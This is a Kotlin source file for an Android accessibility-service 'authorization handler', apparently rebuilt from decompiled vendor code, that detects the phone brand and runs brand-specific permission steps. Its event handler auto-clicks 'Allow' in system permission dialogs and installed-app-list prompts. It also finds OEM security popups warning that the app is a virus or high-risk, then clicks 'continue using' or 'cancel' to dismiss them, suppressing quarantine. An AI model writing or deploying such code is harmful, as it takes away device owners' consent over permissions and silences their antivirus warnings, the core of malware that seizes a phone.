package com.storm.safe.rock.service.modules.yw5xud

import android.content.Context
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.base.AccessibilityDelegate
import com.storm.safe.rock.service.modules.base.ListenWindow
import java.util.LinkedHashSet

/**
 * Yw5xud Authorization Handler — orchestrator for all brand-specific permission flows.
 *
 * Matches vendor C0372a9 (a9). Key responsibilities:
 * - OS family detection via system properties
 * - Brand detection via Build.BRAND/MANUFACTURER
 * - Dispatch to brand-specific Steps classes
 * - BFS text collection from accessibility tree
 * - CheckBox/CompoundButton finding for toggle operations
 * - Permission allow button ID matching
 * - Background thread management
 */
open class Yw5xudHandler(
    service: MyAccessibilityService?,
    context: Context
) : AccessibilityDelegate("Yw5xudHandler", service, context) {

    // Test-friendly constructor
    constructor(context: Context) : this(null, context)

    companion object {
        private const val TAG = "Yw5xudAuthHandler"

        /** Permission allow button resource IDs (vendor f55154b1) */
        val PERMISSION_ALLOW_BUTTON_IDS = listOf(
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.google.android.permissioncontroller:id/permission_allow_button",
            "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.google.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.android.packageinstaller:id/permission_allow_button",
            "com.google.android.packageinstaller:id/permission_allow_button",
            "android:id/button1",
            "com.android.settings:id/action_button"
        )

        /** BFS constants matching vendor a6() */
        private const val MAX_TEXT_ITEMS = 50
        private const val MAX_BFS_ITERATIONS = 200
        private const val MAX_BFS_DEPTH = 10
        private const val MAX_CHILDREN_PER_NODE = 15

        /** Virus/malware popup keywords (vendor m212458b8) */
        val VIRUS_KEYWORDS = listOf(
            "被检测为病毒", "被检视为病毒", "高风险", "发现恶意应用",
            "应用风险", "发现病毒应用", "存在高风险", "建议立即卸载"
        )

        /** Virus popup dismiss button texts (vendor m212458b8, priority order) */
        val VIRUS_DISMISS_TEXTS = listOf(
            "继续使用", "恢复开启", "暂不移入", "取消", "Continue", "Cancel"
        )

        /** App list permission keywords (vendor m212458b8) */
        val APP_LIST_KEYWORDS = listOf(
            "读取已安装应用列表", "请求读取已安装应用", "读取已安装应用",
            "获取已安装应用", "查看已安装应用", "应用列表"
        )

        /** Risk control keywords (vendor m212458b8) */
        val RISK_CONTROL_KEYWORDS = listOf(
            "移入管控", "移入风险管控", "应用管控中心", "管控恶意应用", "移入隔离箱"
        )

        /** Permission allow text keywords for text-based search (vendor b7 + ALLOW keywords) */
        val PERMISSION_ALLOW_TEXTS = listOf(
            "允许", "Allow", "仅在使用该应用时允许", "仅本次使用时允许",
            "仅在使用中允许", "While using the app", "Only this time",
            "Turn on", "Accept"
        )

        /**
         * BFS collect visible text/contentDescription from accessibility tree.
         * Matches vendor m212438a6().
         * @return up to [MAX_TEXT_ITEMS] unique text strings
         */
        fun collectVisibleTexts(root: AccessibilityNodeInfo): Set<String> {
            val result = LinkedHashSet<String>()
            val queue = ArrayDeque<Pair<AccessibilityNodeInfo, Int>>()
            queue.addLast(root to 0)
            var iterations = 0

            while (queue.isNotEmpty() && result.size < MAX_TEXT_ITEMS && iterations < MAX_BFS_ITERATIONS) {
                val (node, depth) = queue.removeLast() // DFS-like (stack) per vendor
                iterations++
                try {
                    if (node.isVisibleToUser) {
                        node.text?.toString()?.trim()?.takeIf { s -> s.isNotEmpty() }?.let { s -> result.add(s) }
                        node.contentDescription?.toString()?.trim()?.takeIf { s -> s.isNotEmpty() }?.let { s -> result.add(s) }
                    }
                    if (depth < MAX_BFS_DEPTH) {
                        val childCount = minOf(node.childCount, MAX_CHILDREN_PER_NODE)
                        for (i in 0 until childCount) {
                            node.getChild(i)?.let { child -> queue.addLast(child to depth + 1) }
                        }
                    }
                } catch (_: Exception) {}
            }
            return result
        }

        /**
         * Find CheckBox/CompoundButton sibling or clickable parent.
         * Matches vendor m212440b5().
         */
        @Suppress("DEPRECATION")
        fun findCheckBoxOrClickableParent(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
            try {
                val className = node.className?.toString() ?: ""
                // If node itself is a CheckBox/CompoundButton, return it
                if (className.contains("CheckBox") || className.contains("CompoundButton")) {
                    return node
                }
                // Search siblings for CheckBox/CompoundButton
                val parent = node.parent ?: return null
                val childCount = parent.childCount
                for (i in 0 until childCount) {
                    val child = parent.getChild(i) ?: continue
                    val childClass = child.className?.toString() ?: ""
                    if (childClass.contains("CheckBox") || childClass.contains("CompoundButton")) {
                        parent.recycle()
                        return child
                    }
                    child.recycle()
                }
                // Fallback: if parent is clickable, return it
                if (parent.isClickable) {
                    return parent
                }
                parent.recycle()
            } catch (_: Exception) {}
            return null
        }
    }

    // Background thread for engine operations (vendor f55147a4)
    private val bgThread = HandlerThread("Yw5xudBg").also { t -> t.start() }
    val bgHandler = Handler(bgThread.looper)

    // Authorization state (vendor f55149a6)
    @Volatile
    var isAuthorizing: Boolean = false
        private set

    // Delay constants (vendor f55151a8, f55157b4)
    val stepDelay: Long = 300L

    // -- Brand dispatch --

    override suspend fun doExecute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        isAuthorizing = true
        try {
            Log.i(TAG, "\uD83D\uDE80 [Yw5xud] \u5F00\u59CB\u6388\u6743: ${android.os.Build.BRAND}")

            val isInternational = BrandDetector.isInternationalBrand()
            val isVivo = BrandDetector.isVivo()
            val isXiaomi = BrandDetector.isXiaomi()
            val isSamsung = BrandDetector.isSamsung()
            val isMeizu = BrandDetector.isMeizu()
            val isHuawei = BrandDetector.isHuawei()
            val isOppo = BrandDetector.isOppo()

            // International brand detection + autostart (vendor s60.m214564a2)
            if (isInternational) {
                logs.add("\u56FD\u9645\u54C1\u724C\u68C0\u6D4B")
                // GenericSteps will handle international brand autostart
            }

            // Brand-specific dispatch (matches vendor switch in a2/doExecute)
            when {
                isSamsung -> {
                    logs.add("\u54C1\u724C\u8BC6\u522B: Samsung \u2192 SamsungSteps")
                    executeSamsungSteps(successes, failures, logs)
                }
                isHuawei -> {
                    logs.add("\u54C1\u724C\u8BC6\u522B: Huawei/Honor \u2192 HuaweiSteps")
                    executeHuaweiSteps(successes, failures, logs)
                }
                isOppo -> {
                    logs.add("\u54C1\u724C\u8BC6\u522B: OPPO/Realme/OnePlus \u2192 OppoSteps")
                    executeOppoSteps(successes, failures, logs)
                }
                isVivo -> {
                    logs.add("\u54C1\u724C\u8BC6\u522B: Vivo/iQOO \u2192 VivoSteps")
                    executeVivoSteps(successes, failures, logs)
                }
                isXiaomi -> {
                    logs.add("\u54C1\u724C\u8BC6\u522B: Xiaomi/Redmi/POCO \u2192 MiuiSteps")
                    executeMiuiSteps(successes, failures, logs)
                }
                isMeizu -> {
                    logs.add("\u54C1\u724C\u8BC6\u522B: Meizu \u2192 MeizuSteps")
                    executeMeizuSteps(successes, failures, logs)
                }
                else -> {
                    // Fallback: detect by OS family
                    val osFamily = OsFamily.detect()
                    logs.add("\u54C1\u724C\u672A\u8BC6\u522B, OS\u68C0\u6D4B: ${osFamily.id}")
                    when (osFamily) {
                        OsFamily.EMUI -> executeHuaweiSteps(successes, failures, logs)
                        OsFamily.MIUI -> executeMiuiSteps(successes, failures, logs)
                        OsFamily.COLOROS -> executeOppoSteps(successes, failures, logs)
                        OsFamily.ORIGINOS -> executeVivoSteps(successes, failures, logs)
                        OsFamily.ONEUI -> executeSamsungSteps(successes, failures, logs)
                        OsFamily.FLYME -> executeMeizuSteps(successes, failures, logs)
                        OsFamily.UNKNOWN -> {
                            logs.add("\u672A\u77E5\u54C1\u724C/OS, \u4F7F\u7528\u901A\u7528\u6B65\u9AA4")
                        }
                    }
                }
            }

            // Always run generic steps (vendor a8)
            executeGenericSteps(successes, failures, logs)

        } finally {
            isAuthorizing = false
        }
    }

    // --- Brand step dispatch (instantiate Steps classes per vendor pattern) ---

    internal open suspend fun executeMiuiSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
        try {
            MiuiSteps(service, context).execute(s, f, l)
        } catch (e: Exception) {
            Log.e(TAG, "小米/MIUI授权流程异常: ${e.message}", e)
            f.add("小米/MIUI授权流程异常: ${e.message}")
        }
    }
    internal open suspend fun executeHuaweiSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
        try {
            HuaweiSteps(service, context).execute(s, f, l)
        } catch (e: Exception) {
            Log.e(TAG, "华为/荣耀授权流程异常: ${e.message}", e)
            f.add("华为/荣耀授权流程异常: ${e.message}")
        }
    }
    internal open suspend fun executeOppoSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
        try {
            OppoSteps(service, context).execute(s, f, l)
        } catch (e: Exception) {
            Log.e(TAG, "OPPO/Realme/OnePlus授权流程异常: ${e.message}", e)
            f.add("OPPO/Realme/OnePlus授权流程异常: ${e.message}")
        }
    }
    internal open suspend fun executeVivoSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
        try {
            VivoSteps(service, context).execute(s, f, l)
        } catch (e: Exception) {
            Log.e(TAG, "vivo/iQOO授权流程异常: ${e.message}", e)
            f.add("vivo/iQOO授权流程异常: ${e.message}")
        }
    }
    internal open suspend fun executeSamsungSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
        try {
            SamsungSteps(service, context).execute(s, f, l)
        } catch (e: Exception) {
            Log.e(TAG, "三星授权流程异常: ${e.message}", e)
            f.add("三星授权流程异常: ${e.message}")
        }
    }
    internal open suspend fun executeMeizuSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
        try {
            MeizuSteps(service, context).execute(s, f, l)
        } catch (e: Exception) {
            Log.e(TAG, "魅族授权流程异常: ${e.message}", e)
            f.add("魅族授权流程异常: ${e.message}")
        }
    }
    internal open suspend fun executeGenericSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
        try {
            GenericSteps(service, context).execute(s, f, l)
        } catch (e: Exception) {
            Log.e(TAG, "通用授权流程异常: ${e.message}", e)
            f.add("国外通用授权流程异常: ${e.message}")
        }
    }

    // Throttle timestamps (vendor f55150a7, f55153b0)
    private var lastEventTime: Long = 0L
    private var lastPermClickTime: Long = 0L

    // --- Event handling (vendor b7 + b8) ---

    override fun onAccessibilityEvent(event: AccessibilityEvent, packageName: String, className: String) {
        if (!isActive || !isAuthorizing) return
        val now = System.currentTimeMillis()
        if (now - lastEventTime < stepDelay) return // 300ms throttle per vendor
        lastEventTime = now

        try {
            val root = service?.rootInActiveWindow ?: return

            // 1. Virus/malware popup detection (vendor m212458b8)
            if (handleVirusPopup(root, packageName)) return

            // 2. Permission auto-grant: ViewId search (vendor b7 phase 1)
            if (clickPermissionByViewId(root)) return

            // 3. Permission auto-grant: text search fallback (vendor b7 phase 2)
            if (now - lastPermClickTime >= stepDelay) {
                if (clickPermissionByText(root)) {
                    lastPermClickTime = now
                    return
                }
            }
        } catch (_: Exception) {}
    }

    // --- Virus/malware popup handler (vendor m212458b8, ~418 lines) ---

    /**
     * Detect and dismiss virus/malware/risk warning popups from OEM security apps.
     * Matches vendor m212458b8(). Checks visible text for virus keywords,
     * then clicks dismiss buttons ("继续使用"/"恢复开启"/"取消"/"暂不移入").
     */
    private fun handleVirusPopup(root: AccessibilityNodeInfo, packageName: String): Boolean {
        // Don't handle our own package
        if (packageName.equals(context.packageName, ignoreCase = true)) return false

        val texts = collectVisibleTexts(root)
        if (texts.isEmpty()) return false

        // Check for virus/risk keywords (vendor: 被检测为病毒, 高风险, 发现恶意应用, etc.)
        val hasVirusKeyword = texts.any { text ->
            VIRUS_KEYWORDS.any { keyword -> text.contains(keyword, ignoreCase = true) }
        }
        if (!hasVirusKeyword) {
            // Check for installed-apps-list permission dialog
            val hasAppListKeyword = texts.any { text ->
                APP_LIST_KEYWORDS.any { keyword -> text.contains(keyword, ignoreCase = true) }
            }
            if (hasAppListKeyword) {
                // Click "允许"/"Allow" for app list access
                return clickByTextMatch(root, "允许") || clickByTextMatch(root, "Allow")
            }
            // Check for risk control popup ("移入管控")
            val hasRiskControl = texts.any { text ->
                RISK_CONTROL_KEYWORDS.any { keyword -> text.contains(keyword, ignoreCase = true) }
            }
            if (hasRiskControl) {
                return clickByTextMatch(root, "取消") || clickByTextMatch(root, "Cancel")
            }
            return false
        }

        // Virus popup found — try dismiss buttons in priority order
        Log.w(TAG, "🦠 检测到病毒弹窗, 尝试关闭")
        for (dismissText in VIRUS_DISMISS_TEXTS) {
            if (clickByTextMatch(root, dismissText)) {
                Log.i(TAG, "✅ 病毒弹窗已关闭: $dismissText")
                return true
            }
        }
        return false
    }

    // --- Enhanced permission clicking (vendor m212457b7) ---

    /** Phase 1: Click permission allow button by ViewId. */
    private fun clickPermissionByViewId(root: AccessibilityNodeInfo): Boolean {
        for (buttonId in PERMISSION_ALLOW_BUTTON_IDS) {
            try {
                val nodes = root.findAccessibilityNodeInfosByViewId(buttonId)
                if (nodes.isNullOrEmpty()) continue
                for (node in nodes) {
                    if (node.isVisibleToUser) {
                        if (clickWithParentFallback(node)) {
                            Log.i(TAG, "✅ 权限按钮点击(ViewId): $buttonId")
                            return true
                        }
                    }
                }
            } catch (_: Exception) {}
        }
        return false
    }

    /** Phase 2: Click permission allow button by text search. Vendor b7 fallback. */
    private fun clickPermissionByText(root: AccessibilityNodeInfo): Boolean {
        for (allowText in PERMISSION_ALLOW_TEXTS) {
            if (clickByTextMatch(root, allowText)) {
                Log.i(TAG, "✅ 权限按钮点击(Text): $allowText")
                return true
            }
        }
        return false
    }

    // --- Core helper methods (vendor a3, a4, a5) ---

    /**
     * Click a node by matching visible text. Vendor m212449a5().
     * Searches via findAccessibilityNodeInfosByText, then clicks if text matches.
     */
    fun clickByTextMatch(root: AccessibilityNodeInfo, text: String): Boolean {
        try {
            val nodes = root.findAccessibilityNodeInfosByText(text)
            if (nodes.isNullOrEmpty()) return false
            for (node in nodes) {
                if (node.isVisibleToUser) {
                    val nodeText = node.text?.toString()?.trim() ?: ""
                    if (nodeText == text || nodeText.contains(text, ignoreCase = true)) {
                        if (clickWithParentFallback(node)) {
                            nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                            return true
                        }
                    }
                }
            }
            nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
        } catch (_: Exception) {}
        return false
    }

    /**
     * Click a checkbox found near text. Vendor m212447a3().
     * Searches by text, finds sibling CheckBox/CompoundButton, clicks if not checked.
     */
    fun clickCheckboxByText(root: AccessibilityNodeInfo, text: String): Boolean {
        try {
            val nodes = root.findAccessibilityNodeInfosByText(text)
            if (nodes.isNullOrEmpty()) return false
            for (node in nodes) {
                if (node.isVisibleToUser) {
                    val checkbox = findCheckBoxOrClickableParent(node)
                    if (checkbox != null) {
                        if (checkbox.isChecked) {
                            Log.d(TAG, "[clickCheckboxByText] 已勾选: $text")
                            nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                            return true
                        }
                        if (clickWithParentFallback(checkbox)) {
                            Log.d(TAG, "[clickCheckboxByText] ✅ 点击成功: $text")
                            nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                            return true
                        }
                    }
                    // Fallback: click text node directly
                    if (clickWithParentFallback(node)) {
                        nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
                        return true
                    }
                }
            }
            nodes.forEach { try { it.recycle() } catch (_: Exception) {} }
        } catch (e: Exception) {
            Log.w(TAG, "[clickCheckboxByText] 异常: ${e.message}")
        }
        return false
    }

    /**
     * Click node, walking up parent chain (5 levels) with gesture fallback.
     * Vendor m212448a4(). Enhanced version of clickNodeOrParent.
     */
    fun clickWithParentFallback(node: AccessibilityNodeInfo): Boolean {
        // Direct click
        if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
        // Walk up parents (5 levels per vendor, not 3)
        var parent = node.parent
        var depth = 0
        while (parent != null && depth < 5) {
            if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                parent.recycle()
                return true
            }
            val grandparent = parent.parent
            parent.recycle()
            parent = grandparent
            depth++
        }
        // Gesture fallback: tap center of node bounds
        try {
            val rect = android.graphics.Rect()
            node.getBoundsInScreen(rect)
            if (rect.width() > 0 && rect.height() > 0) {
                val path = android.graphics.Path()
                path.moveTo(rect.centerX().toFloat(), rect.centerY().toFloat())
                val gesture = android.accessibilityservice.GestureDescription.Builder()
                    .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 50))
                    .build()
                service?.dispatchGesture(gesture, null, null)
                return true
            }
        } catch (_: Exception) {}
        return false
    }

    override fun getListenWindows(): List<ListenWindow> {
        // Listen to permission controller and settings
        return listOf(
            ListenWindow("com.android.permissioncontroller"),
            ListenWindow("com.google.android.permissioncontroller"),
            ListenWindow("com.android.packageinstaller"),
            ListenWindow("com.google.android.packageinstaller"),
            ListenWindow("com.android.settings")
        )
    }

    override fun dispose() {
        isAuthorizing = false
        bgThread.quitSafely()
        super.dispose()
    }
}
